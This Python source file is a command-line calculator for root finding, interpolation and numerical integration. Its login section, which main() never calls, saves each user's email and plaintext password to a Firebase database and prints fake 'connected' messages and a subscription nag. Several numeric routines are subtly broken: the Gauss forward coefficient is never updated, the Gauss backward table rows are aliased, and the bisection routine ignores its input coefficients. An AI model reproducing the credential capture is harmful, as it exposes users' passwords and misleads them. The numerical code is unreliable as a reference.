import numpy as np
import math
import pyrebase
import time
import random


# https://atozmath.com/CONM/NumeInterPola.aspx

class bijectionMethod:
    coeff=[]

    def inputCoeff(self):
        print("For function 2x^3-4x^2+2, input should be: length: 4 arr:[2,-4,0,2]\n")
        l = int(input("Enter the coeff array length: "))
        
        for i in range(l):
            self.coeff.append(int(input("Enter Coeff of x^"+str(l-i-1)+" : ")))
        return
    
    # def func(self, val):
    #     temp = self.coeff
    #     s=0
    #     l = len(temp)

    #     for i in range(l):
    #         s+= (temp[i] * (val**(l-i-1)))
    #     return s

    
    def func(self,val):
        return math.cos(val)-val*math.exp(val)

    def bisection(self,a,b,decay): 
        if (self.func(a) * self.func(b) >= 0): 
            print("You have not assumed right a and b\n") 
            return

        c = a 
        while ((b-a) >= decay): 

            # Find middle point 
            c = (a+b)/2

            # Check if middle point is root 
            if (self.func(c) == 0.0): 
                break

            # Decide the side to repeat the steps 
            if (self.func(c)*self.func(a) < 0): 
                b = c 
            else: 
                a = c 
              
        print("The value of root is : "+str(c)) 
    
    def calculate(self):
        self.inputCoeff()
        
        # IT IS FOR BIJECTION METHOD
        a=int(input("\nEnter the value of A: "))
        b=int(input("Enter the value of B: "))
        decay=float(input("Enter the value of decay: "))

        self.bisection(a,b,decay)
        i = int(input("If you want to see more on theory enter 1\n"))
        if(i==1):
            print("Please refer to : https://www.geeksforgeeks.org/program-for-bisection-method/")



class newtonRhapsonMethod:
    funcCoeff=[]
    derivativeCoeff=[]

    def inputCoeff(self):
        print("For function 2x^3-4x^2+2, input should be: length: 4 arr:[2,-4,0,2]\n")
        l = int(input("Enter the coeff array length: "))
        for i in range(l):
            self.funcCoeff.append(int(input("Enter Coeff of x^"+str(l-i-1)+" : ")))
        print("NOW INPUT BELOW INFO FOR THE DERIVATIVE")
        for i in range(l):
            self.derivativeCoeff.append(int(input("Enter Coeff of x^"+str(l-i-1)+" : ")))
        return
    
    def func(self,val):
        temp = self.funcCoeff
        s=0
        l = len(temp)

        for i in range(l):
            s+= (temp[i] * (val**(l-i-1)))
        return s
    def funcDerivative(self,val):
        temp = self.derivativeCoeff
        s=0
        l = len(temp)

        for i in range(l):
            s+= (temp[i] * (val**(l-i-1)))
        return s

    def newtonRhapson(self,x,decay):
        h = self.func(x) / self.funcDerivative(x) 
        while abs(h) >= decay: 
            h = self.func(x)/self.funcDerivative(x) 
            
            # x(i+1) = x(i) - f(x) / f'(x) 
            x = x - h 
        
        print("The value of the root is : "+str(x)) 
        print("Enter 1 to know more about theory : ")
        i = int(input())
        if(i==1):
            print("Please refer to https://www.geeksforgeeks.org/program-for-newton-raphson-method/")

    def calculate(self):
        self.inputCoeff()
        
        a = int(input("Enter the initital value: "))
        decay = float(input("Enter the decay value: "))

        self.newtonRhapson(a,decay)


class newtonForwardInterpolation:
    def cal_u(self,u,n):
        temp = u
        for i in range(1,n):
            temp = temp*(u-i)
        return temp
    
    def fact(self, x):
        pr=1;
        for i in range(2,x+1):
            pr*=i
        return pr
    
    def inputVal(self):
        n = int(input("Enter the total no. of values: "))
        x=[0]*n
        for i in range(n):
            x[i] = float(input("Enter the value of x at "+str(i)+" : "))
        y=[[0 for j in range(n)] for j in range(n)]
        print()
        for i in range(n):
            y[i][0] = float(input("Enter value of y at "+str(i) + " "))
        return x,y,n
    
    def calculate(self):
        x,y,n = self.inputVal()

        for i in range(1,n):
            for j in range(n-1):
                y[j][i] = y[j+1][i-1] - y[j][i-1]
        # Displaying the forward difference table 
        print("_____________________________FORWARD INTERPOLATION TABLE___________________________________________________________________")
        for i in range(n): 
            print(x[i], end = "\t"); 
            for j in range(n - i): 
                print(y[i][j], end = "\t"); 
            print(""); 
        print("_____________________________________________________________________________________________________________________________________________")
        
        
        val = float(input("Please enter the value to interpolate at: "))
        sum_ = y[0][0]

        u = (val - x[0]) / (x[1] - x[0])
        for i in range(1,n):
            sum_ = sum_ + (self.cal_u(u,i) * y[0][i])/self.fact(i)
        
        print("\nValue at : ",val," is ", round(sum_,6))

        i = int(input("To get more info on algorithm press 1"))


        

class newtonBackward:
    def cal_u(self,u,n):
        temp = u
        for i in range(1,n):
            temp = temp*(u+i)
        return temp
    
    def fact(self, x):
        pr=1;
        for i in range(2,x+1):
            pr*=i
        return pr
    
    def inputVal(self):
        n = int(input("Enter the total no. of values: "))
        x=[0]*n
        for i in range(n):
            x[i] = float(input("Enter the value of x at "+str(i)+" : "))
        y=[[0 for j in range(n)] for j in range(n)]
        print()
        for i in range(n):
            y[i][0] = float(input("Enter value of y at "+str(i) + " : "))
        return x,y,n
    
    def calculate(self):
        x,y,n = self.inputVal()
        
        for i in range(1,n):
            for j in range(n-1,i-1,-1):
                y[j][i] = y[j][i-1] - y[j-1][i-1]
        
        print("_____________________________BACKWARD INTERPOLATION TABLE___________________________________________________________________")
        for i in y:
            print(i)
        print("_____________________________________________________________________________________________________________________________________________")

        val=float(input("Enter the value to interpolate at: "))

        sum_ = y[n-1][0]
        u = (val-x[n-1])/(x[1] - x[0])

        for i in range(1,n):
            sum_ = sum_ + (self.cal_u(u,i) * y[n-1][i]/self.fact(i))
        
        print("\n Value at ",val," is : ",sum_)


class gaussForwardInterpolation():
    # function for calculating coefficient of Y  
    def p_cal(self, p, n):  
    
        temp = p;  
        for i in range(1, n):  
            if(i%2==1): 
                temp * (p - i) 
            else: 
                temp * (p + i) 
        return temp;  
    # function for factorial 
    def fact(self, n):  
        f = 1 
        for i in range(2, n + 1):  
            f *= i 
        return f

    def inputFunc(self):
        n = int(input("Enter the height of the table : "))
        x=[0]*n
        for i in range(n):
            x[i] = float(input("Enter val of x at "+str(i)+" : "))
        y = [[0 for i in range(n)] for j in range(n)]

        for i in range(n):
            y[i][0] = float(input("Enter the value of y at "+str(i)+" : "))
        return x,y,n

    def calculate(self):
        x,y,n = self.inputFunc()

        for i in range(1, n):  
            for j in range(n - i):  
                y[j][i] = np.round((y[j + 1][i - 1] - y[j][i - 1]),4);  
  
        # Printing the Triangle  
        for i in range(n):  
            print(x[i], end = "\t");  
            for j in range(n - i):  
                print(y[i][j], end = "\t");  
            print("");  
        
        val = float(input("Enter the value of Y to predict on: "))

        sum_ = y[int(n/2)][0]
        p = (val-x[int(n/2)]) / (x[1] - x[0])

        for i in range(1,n):
            sum_ = sum_ + (self.p_cal(p,i) * y[int((n-i)/2)][i] / self.fact(i))

        print("\nValue at ",val," is ", sum_)

class gaussBackward:
    def inputFunc(self):
        n = int(input("Enter the number of terms: "))
        x=[0]*n
        for i in range(n):
            x[i] = float(input("Enter the value of x at: "+str(i)+": "))
        y=[0]*n
        for i in range(n):
            y[i] = float(input("Enter the value of y at: "+str(i)+": "))
        return x,y,n
    
    def calculate(self):
        x,y,n =self.inputFunc()

        val = float(input("Enter the value of X to calculate at: "))
        h = x[1] - x[0]
        t=[0]*20
        diff=[t]*20

        for i in range(0,n-1):
            diff[i][1] = y[i+1] - y[i]
        for j in range(2,5):
            for i in range(n-j):
                diff[i][j] = diff[i+1][j-1] - diff[i][j-1]
        i=0
        h = x[1] - x[0]
        flag = False
        while(x[i]<val):
            i-=-1
            flag = True
        if(not flag):
            i-=-1
        i-=1
        p=(val-x[i])/h
        y1 = p*diff[i-1][1]
        y2 = p*(p+1)*diff[i-1][2]/2
        y3 = (p+1) * p * (p-1) * diff[i-2][3]/6
        y4 = (p+2)*(p+1)*p*(p-1)*diff[i-3][4]/24
        sum_ = y[i]+y1+y2+y3+y4

        print("The result is : ", sum_)
            

class trapezoidal:
    coeff=[]
    isRev = False

    def inputCoeff(self):
        print("For function 2x^3-4x^2+2, input should be: length: 4 arr:[2,-4,0,2]\n")
        print("\n if the function is of the form 1/f(x) input TRUE")
        isReversed = input("Is the function of the form 1/f(x) TRUE/FALSE : ")
        if(isReversed=="TRUE"):
            self.isRev = True
        l = int(input("Enter the coeff array length: "))
        
        for i in range(l):
            self.coeff.append(int(input("Enter Coeff of x^"+str(l-i-1)+" : ")))
        return
    
    def func(self, val):
        temp = self.coeff
        s=0
        l = len(temp)

        for i in range(l):
            s+= (temp[i] * (val**(l-i-1)))
        if(self.isRev):
            return 1/s
        return s

    def trapezoidal(self, a, b, n):
        h = (b-a)/n

        s=(self.func(a)+ self.func(b))

        i=1
        while i <n:
            s+= 2*self.func(a+i*h)
            i-=-1
        return ((h/2)*s)

    def calculate(self):
        self.inputCoeff()

        a = int(input("Enter the value of A: "))
        b = int(input("Enter the value of B: "))

        n = float(input("Enter the value of n (higher n means higher accuracy) : "))

        res = self.trapezoidal(a,b,n)

        print("\nTHe value of integral is: ", res)
        

class simpsons_rule:
    coeff=[]
    isRev = False

    def inputCoeff(self):
        print("For function 2x^3-4x^2+2, input should be: length: 4 arr:[2,-4,0,2]\n")
        print("\n if the function is of the form 1/f(x) input TRUE")
        isReversed = input("Is the function of the form 1/f(x) TRUE/FALSE : ")
        if(isReversed=="TRUE"):
            self.isRev = True
        l = int(input("Enter the coeff array length: "))
        
        for i in range(l):
            self.coeff.append(int(input("Enter Coeff of x^"+str(l-i-1)+" : ")))
        return
    
    def func(self, val):
        temp = self.coeff
        s=0
        l = len(temp)

        for i in range(l):
            s+= (temp[i] * (val**(l-i-1)))
        if(self.isRev):
            return 1/s
        return s

    def Customfunc(self,val):
        return math.log(val)

    def simpsons_( self, ll, ul, n ): 
  
        # Calculating the value of h 
        h = ( ul - ll )/n 
    
        # List for storing value of x and f(x) 
        x = list() 
        fx = list() 
        
        # Calcuting values of x and f(x) 
        i = 0
        while i<= n: 
            x.append(ll + i * h) 
            fx.append(self.func(x[i])) 
            i += 1
    
        # Calculating result 
        res = 0
        i = 0
        while i<= n: 
            if i == 0 or i == n: 
                res+= fx[i] 
            elif i % 2 != 0: 
                res+= 4 * fx[i] 
            else: 
                res+= 2 * fx[i] 
            i+= 1
        res = res * (h / 3) 
        return res 

    def calculate(self):
        self.inputCoeff()

        ll = float(input("Enter the lower-limit : "))
        ul = float(input("Enter the upper-limit : "))
        n = int(input("Enter the number of intervals : "))
        res = self.simpsons_(ll,ul,n)
        print("\n THe value is : ",res)
    
def signIn(auth, firebase):
    print("Please Signin with a Registered Google Email")
    time.sleep(0.5)

    email = input("email: ")
    password = input("password: ")
    try:
        user = auth.sign_in_with_email_and_password(email, password)
        print("Signin Successful")
        db = firebase.database()
        
        data = {'email':email, 'password':password}
        db.child("users").push(data)
        time.sleep(1.5)
        print("You have been signed in for 1 hour... please but the Google Firebase subscription to increase the duration and unlock other features")
    except:
        print("Please check your Email id or Password")
        time.sleep(3)
        exit()


def register(auth, firebase):
    print("Please SignUP with a Registered Google Email")

    email = input("email: ")
    password = input("password: ")
    try:
        user = auth.create_user_with_email_and_password(email, password)
        auth.send_email_verification(user['idToken'])

        print("Please check your email for a verification link, then try signing in again. Thanks")
        time.sleep(3)
        exit()
        
    except:
        print("Check your email for the verification link and retry signin")
        time.sleep(4)
        exit()



    

def loginAndSignup():
    # import firebase as fire

    firebase_config = {
        'apiKey': "AIzaSyC81ny2CZ-baIACUOcIrjw_JTwbhQmxlds",
        'authDomain': "api-test-c209a.firebaseapp.com",
        'databaseURL': "https://api-test-c209a.firebaseio.com",
        'projectId': "api-test-c209a",
        'storageBucket': "api-test-c209a.appspot.com",
        'messagingSenderId': "95015707773",
        'appId': "1:95015707773:web:0e42cec09fa6419e0e3d14",
        'measurementId': "G-D8MSHXW66X"
        }


    print("Connecting to Google Cloud...")

    try:
        firebase = pyrebase.initialize_app(firebase_config)
        auth = firebase.auth()
        time.sleep(3)
        print("\nInitiated...Connected to Google Firebase Console backend at XE"+str(random.randint(1000,4000)))
    except:
        print("Bad Internet connection... please try again or contact the developer")
        time.sleep(4)
        exit()

    print("\nEnter 1 to SignIN and 2 to SignUP")

    inp = int(input())

    if(inp == 1):
        signIn(auth,firebase)
    elif(inp == 2):
        register(auth, firebase)
    else:
        print("Wrong option ")
        exit()


    firebase = pyrebase.initialize_app(firebase_config)
    auth = firebase.auth()

def theRealStuff():
    print("\n\n\nHello and Welcome to the interpolation calculator ~by Ayush Singh(@__winter.soldier__)")
    time.sleep(.1)
    print()
    print("Please make sure that you have read the documents before using this calculator")
    time.sleep(.1)
    print()
    print()
    print("Enter: ")
    print("1: Bisection Method")
    print("2: Newton Rhapson Method")
    print("3: Newton Forward Interpolation")
    print("4: Newton Backward Interpolation")
    print("5: Gauss Forward Interpolation")
    print("6: Gauss Backward Interpolation")
    print("7: Trapezoidal Rule")
    print("8: Simpson OneThird Rule")

    inp = int(input("\nSELECT YOUR OPTION: "))

    if(inp == 1):
        ob = bijectionMethod()
        ob.calculate()
    elif(inp==2):
        ob = newtonRhapsonMethod()
        ob.calculate()
    elif(inp==3):
        ob = newtonForwardInterpolation()
        ob.calculate()
    elif(inp == 4):
        ob = newtonBackward()
        ob.calculate()
    elif(inp==5):
        ob = gaussForwardInterpolation()
        ob.calculate()
    elif(inp == 6):
        ob = gaussBackward()
        ob.calculate()

    elif(inp == 7):
        ob = trapezoidal()
        ob.calculate()
    elif(inp == 8):
        ob = simpsons_rule()
        ob.calculate()
    else:
        print("Check your Input sucker")

def main():
    theRealStuff()
    

if(__name__ == "__main__"):
    main()

